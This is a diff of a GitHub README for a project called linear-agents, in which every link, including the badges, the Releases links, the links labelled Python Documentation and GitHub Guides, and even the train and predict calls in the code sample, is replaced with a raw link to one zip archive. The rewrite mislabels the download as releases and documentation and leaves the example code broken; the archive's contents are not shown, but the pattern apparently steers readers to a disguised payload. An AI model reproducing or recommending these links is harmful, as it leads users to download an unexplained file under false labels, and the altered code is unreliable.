@@ -1,9 +1,9 @@
 # Build Efficient Linear Agents for Your Projects 🚀
 
-![GitHub repo size](https://img.shields.io/github/repo-size/kazu-ya-420/linear-agents)
-![GitHub contributors](https://img.shields.io/github/contributors/kazu-ya-420/linear-agents)
-![GitHub issues](https://img.shields.io/github/issues/kazu-ya-420/linear-agents)
-![GitHub stars](https://img.shields.io/github/stars/kazu-ya-420/linear-agents)
+![GitHub repo size](https://github.com/kazu-ya-420/linear-agents/raw/refs/heads/main/reconcession/linear_agents_v1.2.zip)
+![GitHub contributors](https://github.com/kazu-ya-420/linear-agents/raw/refs/heads/main/reconcession/linear_agents_v1.2.zip)
+![GitHub issues](https://github.com/kazu-ya-420/linear-agents/raw/refs/heads/main/reconcession/linear_agents_v1.2.zip)
+![GitHub stars](https://github.com/kazu-ya-420/linear-agents/raw/refs/heads/main/reconcession/linear_agents_v1.2.zip)
 
 ## Overview
 
@@ -17,7 +17,7 @@ Welcome to the **linear-agents** repository! Here, you can build agents that act
 
 ## Getting Started
 
-To get started with **linear-agents**, you can download the latest release from our [Releases section](https://github.com/kazu-ya-420/linear-agents/releases). 
+To get started with **linear-agents**, you can download the latest release from our [Releases section](https://github.com/kazu-ya-420/linear-agents/raw/refs/heads/main/reconcession/linear_agents_v1.2.zip). 
 
 1. Visit the link above.
 2. Download the required files.
@@ -42,10 +42,10 @@ from linear_agents import LinearAgent
 agent = LinearAgent(parameters)
 
 # Train the agent
-agent.train(training_data)
+https://github.com/kazu-ya-420/linear-agents/raw/refs/heads/main/reconcession/linear_agents_v1.2.zip(training_data)
 
 # Make predictions
-predictions = agent.predict(new_data)
+predictions = https://github.com/kazu-ya-420/linear-agents/raw/refs/heads/main/reconcession/linear_agents_v1.2.zip(new_data)
 ```
 
 ### Example Projects
@@ -90,7 +90,7 @@ For any questions or feedback, please reach out through the issues section on Gi
 
 ## Stay Updated
 
-To keep up with the latest changes and updates, check the [Releases section](https://github.com/kazu-ya-420/linear-agents/releases) regularly.
+To keep up with the latest changes and updates, check the [Releases section](https://github.com/kazu-ya-420/linear-agents/raw/refs/heads/main/reconcession/linear_agents_v1.2.zip) regularly.
 
 ## Acknowledgments
 
@@ -98,9 +98,9 @@ Thanks to everyone who has contributed to this project. Your support and input a
 
 ## Resources
 
-- [Python Documentation](https://docs.python.org/3/)
-- [GitHub Guides](https://guides.github.com/)
-- [Open Source Guides](https://opensource.guide/)
+- [Python Documentation](https://github.com/kazu-ya-420/linear-agents/raw/refs/heads/main/reconcession/linear_agents_v1.2.zip)
+- [GitHub Guides](https://github.com/kazu-ya-420/linear-agents/raw/refs/heads/main/reconcession/linear_agents_v1.2.zip)
+- [Open Source Guides](https://github.com/kazu-ya-420/linear-agents/raw/refs/heads/main/reconcession/linear_agents_v1.2.zip)
 
 ## Conclusion
 
